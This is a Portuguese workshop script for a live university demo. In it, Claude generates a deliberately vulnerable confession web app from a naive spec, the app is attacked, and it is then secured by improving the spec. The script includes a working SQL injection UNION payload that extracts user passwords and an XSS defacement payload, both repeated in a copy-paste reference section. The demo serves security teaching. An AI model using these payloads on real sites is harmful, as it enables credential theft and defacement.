# Workshop Script — AI Coding: Programador Amplificado

> **Duração:** 60 min | **Formato:** Live demo em palco | **Audiência:** Alunos de Eng. Informática, UMinho

---

## Pre-flight Checklist

- [ ] Chrome aberto, limpo (sem tabs de sessões anteriores)
- [ ] `confessions.db` eliminado (DB limpa)
- [ ] Servidor parado (`lsof -i :3000` → nada a correr)
- [ ] Todos os ficheiros no lugar: `user-stories.md`, `.claude/commands/*`
- [ ] `spec-v1.md` e `spec-v2.md` apagados (vão ser gerados ao vivo)
- [ ] `server.js` e `views/` apagados (vão ser gerados ao vivo)
- [ ] Backup da app vulnerável e segura em `backup/` (fallback)
- [ ] Projector configurado, font size grande no terminal e browser

---

## Ato 0 — Abertura (5 min)

### O que dizer

> *"Quantos de vocês têm medo de ficar sem emprego por causa do AI? Levantem a mão."*

(Pausa dramática.)

> *"Óptimo. Nos próximos 55 minutos vou tentar mudar essa resposta — não com promessas, mas mostrando-vos uma coisa que o AI não sabe fazer sozinho."*

Apresentar os três atores:
1. **Tu** — o programador humano
2. **Claude** — a ferramenta AI
3. **A spec** — o guião que liga os dois

> *"No fim, vão perceber exactamente por onde passa a vossa vantagem humana — e vai ser onde menos esperam."*

---

## Ato 1 — User Stories (5 min)

### O que fazer
1. Abrir `user-stories.md` no ecrã
2. Ler US-01 e US-03 em voz alta (são as mais "inocentes")
3. Passar rapidamente por US-04 e US-05

### O que dizer

> *"Isto foi escrito por um humano — um Product Manager. É o contrato com a AI. O resto vai ser quase todo automático."*

### Micro-interacção #1

> *"Quem olha para isto e acha que falta alguma coisa? Algum requisito que devíamos ter? Pensem 10 segundos."*

(Esperar. Ninguém vai dizer "falta segurança". Se disserem — ótimo, validar e dizer "vamos ver se isso importa".)

> *"Guardem essa sensação. Voltamos a ela daqui a pouco."*

---

## Ato 2 — Gerar a Spec (8 min)

### O que fazer
1. Mostrar brevemente o ficheiro `.claude/commands/spec-generator.md` — *"É um ficheiro de markdown. Instruções para o Claude agir como um júnior."*
2. Executar:

```
/project:spec-generator
```

3. Enquanto gera, narrar
4. Abrir `spec-v1.md` e passar rapidamente pelas secções

### O que dizer enquanto gera

> *"Isto é o que faz um júnior — transforma desejos em passos técnicos. Reparem no que ele inclui. E mais importante — no que NÃO inclui."*

### Depois de gerado

Abrir `spec-v1.md`, mostrar:
- Queries SQL com template literals (string interpolation)
- Templates com `<%- %>` (unescaped)
- Zero menção a segurança

> *"Alguma menção a segurança? Validação? Autenticação? Nada. E isso é exactamente o que pedimos."*

> *"Guardem esta palavra: **spec**. Ainda voltamos a ela."*

---

## Ato 3 — Gerar Código + Demo Feliz (10 min)

### O que fazer
1. Mostrar brevemente `.claude/commands/code-generator.md`
2. Executar:

```
/project:code-generator spec-v1.md
```

3. Depois de gerado:

```bash
rm -f confessions.db
npm install
node server.js
```

4. Abrir Chrome em `http://localhost:3000/`

### Happy path demo

| Passo | Acção | Resultado esperado |
|---|---|---|
| 1 | Submeter confissão: "O prof de ES deu-nos 2 semanas mas eu fiz tudo na última noite" / LEI | Aparece no feed |
| 2 | Submeter mais 2-3 confissões com tags diferentes (MIEI, LESI) | Feed cresce |
| 3 | Pesquisar "biblioteca" | Filtra corretamente |
| 4 | Pesquisa vazia | Mostra tudo |
| 5 | Abrir `/admin` | Lista todas as confissões |
| 6 | Apagar uma confissão | Desaparece da lista e do feed |

### O que dizer

> *"20 minutos. De user stories a uma app funcional. Submissão, feed, pesquisa, admin — tudo funciona. Será que acabámos?"*

(Pausa dramática.)

> *"Vamos testar um bocadinho mais a fundo."*

---

## Ato 4 — Encontrar Bugs (12 min) — MOMENTO WOW #1

### Micro-interacção #2

> *"Alguém quer apostar quantas vulnerabilidades de segurança existem nesta app? Levantem dedos."*

### Demo 1 — SQL Injection (extração de credenciais)

**Na caixa de pesquisa, escrever:**
```
' UNION SELECT 1,username||' : '||password,email,'' FROM users--
```

**Resultado:** Usernames e passwords aparecem no feed como confissões:
- `admin : admin123` (admin@uminho.pt)
- `prof_silva : password456` (silva@di.uminho.pt)
- `maria_lei : uminho2024` (maria@alunos.uminho.pt)
- `joao_miei : qwerty789` (joao@alunos.uminho.pt)

### O que dizer

> *"Estão a ver isto? Acabei de extrair TODOS os usernames e passwords da base de dados. Através da caixa de pesquisa. Qualquer aluno pode fazer isto."*

### Demo 2 — XSS (defacement)

**No console do browser (F12), executar:**
```js
fetch('/confessions', {
  method: 'POST',
  headers: {'Content-Type': 'application/x-www-form-urlencoded'},
  body: 'text=' + encodeURIComponent('<div style="position:fixed;top:0;left:0;width:100%;height:100%;background:red;z-index:9999;display:flex;align-items:center;justify-content:center;flex-direction:column"><h1 style="color:white;font-size:4rem">HACKEADO</h1><p style="color:white;font-size:1.5rem">Este site foi comprometido por um aluno de LEI</p></div>') + '&tag=HACK'
})
```

**Recarregar a página.** Resultado: ecrã inteiro vermelho com "HACKEADO".

### O que dizer

> *"Qualquer aluno que submeta isto como confissão — destrói o site inteiro. Para TODOS os visitantes. Incluindo a página de admin."*

### Limpeza do XSS

No terminal (o admin está bloqueado pelo overlay):
```bash
node -e "require('better-sqlite3')('confessions.db').prepare(\"DELETE FROM confessions WHERE tag = 'HACK'\").run()"
```

Recarregar a página — volta ao normal.

### Demo 3 — Admin sem autenticação

> *"E a página de admin? Abram `localhost:3000/admin`. Sem login, sem password, sem nada. Qualquer pessoa que saiba o URL pode apagar todas as confissões."*

### Resumo para a audiência

> *"Três vulnerabilidades. SQL Injection — extraí passwords. XSS — destruí a página. Zero autenticação no admin. E sabem o que é mais assustador? O código está CORRECTO. Implementa EXACTAMENTE o que a spec pediu. O problema não é o AI. É o que lhe pedimos."*

---

## Ato 5 — Corrigir Reactivamente (10 min)

### O que fazer
1. Pedir ao Claude para corrigir:

> *"Analisa o código da aplicação em `server.js` e `views/`. Corrige as vulnerabilidades de segurança que encontraste: SQL injection, XSS, e falta de autenticação no admin. Mantém toda a funcionalidade."*

2. Claude edita os ficheiros
3. Reiniciar o servidor
4. Re-testar os 3 exploits — todos devem falhar agora

### O que dizer

> *"O AI encontrou bugs. O AI corrigiu os bugs. O AI validou a correcção. Então... qual é o meu papel aqui?"*

(Pausa longa.)

> *"Ficámos com uma aplicação segura? Sim. Mas isto é trabalho REACTIVO. Primeiro criei o problema. Depois pedi para o resolver. E se tivesse pedido melhor à partida?"*

---

## Ato 6 — O Twist: Validar a Spec (8 min) — MOMENTO WOW #2

### O que fazer
1. **Deitar tudo fora** — apagar código, voltar só à spec:

```bash
rm -f confessions.db server.js
rm -f views/*.ejs
```

2. Mostrar `.claude/commands/spec-validator.md`
3. Executar:

```
/project:spec-validator spec-v1.md
```

4. Abrir `spec-v2.md` — mostrar as diferenças (mesma estrutura, com segurança adicionada)
5. Gerar código novo:

```
/project:code-generator spec-v2.md
```

6. Arrancar, testar — **zero vulnerabilidades**

### O que dizer

> *"Reparem no que mudou. Não mudei o modelo. Não mudei a skill de código. Não aprendi um novo framework."*

> ***"Mudei a spec."***

> *"E a diferença entre um programador júnior e sénior nos próximos anos não vai ser escrever código mais rápido — o AI já faz isso. Vai ser saber o que pedir. E isso, não há modelo que vos tire."*

---

## Wrap-up + Q&A (2 min)

> *"Todas as skills que usei estão neste repo. São ficheiros de markdown — não há magia. Podem clonar, alterar, fazer as vossas."*

> *"A pergunta com que quero que saiam daqui não é 'o AI vai substituir-me?' É: 'o que é que eu sei pedir que mais ninguém sabe?'"*

> *"O workshop acaba aqui, mas o vosso trabalho começa."*

---

## Budget de Tempo

| Ato | Duração | Acumulado |
|---|---|---|
| 0 — Abertura | 5 min | 5 min |
| 1 — User Stories | 5 min | 10 min |
| 2 — Gerar Spec | 8 min | 18 min |
| 3 — Gerar Código + Demo | 10 min | 28 min |
| 4 — Encontrar Bugs | 12 min | 40 min |
| 5 — Corrigir Reactivamente | 10 min | 50 min |
| 6 — Twist: Validar a Spec | 8 min | 58 min |
| Wrap-up + Q&A | 2 min | 60 min |

Buffer: 0 min. Se algo atrasar, comprimir wrap-up ou cortar micro-interacção #2.

---

## Fallbacks de Emergência

| Problema | Solução |
|---|---|
| Claude gera código seguro em vez de vulnerável | Usar app pré-gerada em `backup/app-vulnerable/` |
| Claude demora muito a gerar | Ter `spec-v1.md` e código pré-gerados prontos a copiar |
| Servidor não arranca | `lsof -i :3000` → matar processo; `rm confessions.db` → reiniciar |
| XSS não funciona (browser bloqueia) | Usar payload sem `<script>` — usar `<img>` ou `<div>` com style (o payload no script já usa `<div>`) |
| SQLi payload com erro de sintaxe | Ter o payload guardado num ficheiro de texto para copiar/colar |
| Ato 6 gera código ainda vulnerável | Usar app pré-gerada em `backup/app-secure/` |
| Internet falha | Tudo corre local — não depende de internet (Claude Desktop com modelo local ou API pré-autorizada) |

---

## Payloads de Referência (copiar/colar)

### SQLi — Pesquisa
```
' UNION SELECT 1,username||' : '||password,email,'' FROM users--
```

### XSS — Console do Browser
```js
fetch('/confessions', {method:'POST', headers:{'Content-Type':'application/x-www-form-urlencoded'}, body:'text=' + encodeURIComponent('<div style="position:fixed;top:0;left:0;width:100%;height:100%;background:red;z-index:9999;display:flex;align-items:center;justify-content:center;flex-direction:column"><h1 style="color:white;font-size:4rem">HACKEADO</h1><p style="color:white;font-size:1.5rem">Este site foi comprometido por um aluno de LEI</p></div>') + '&tag=HACK'})
```

### Limpeza XSS
```bash
node -e "require('better-sqlite3')('confessions.db').prepare(\"DELETE FROM confessions WHERE tag = 'HACK'\").run()"
```
